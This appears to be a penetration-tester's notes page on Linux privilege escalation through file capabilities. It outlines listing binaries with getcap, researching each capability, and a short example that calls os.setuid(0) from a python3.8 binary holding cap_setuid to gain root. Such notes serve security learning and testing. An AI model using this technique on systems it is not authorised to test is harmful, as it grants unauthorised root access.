# Privilege Escalation via Capabilities

---

## What are Capabilities?

See [[capabilities|here]].

---

## Capabilities Privilege Escalation Process

1. [[capabilities#List All Binaries with Capabilities|List all executables configured with a capability]]
2. For each executable configured with a capability:
	- For each capability configured on the executable:
		- [[capabilities#Short Description of Each Capability https book hacktricks xyz linux-unix privilege-escalation linux-capabilities|Research the capability]] and determine if it can be used to elevate privileges
		- Exploit the executable to elevate privileges

---

## Exploit Python `cap_setuid` Capability

```bash
$ getcap -r / 2>/dev/null
...
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
...

$ /usr/bin/python3.8
>>> import os
>>> os.setuid(0)
>>> # do things
```
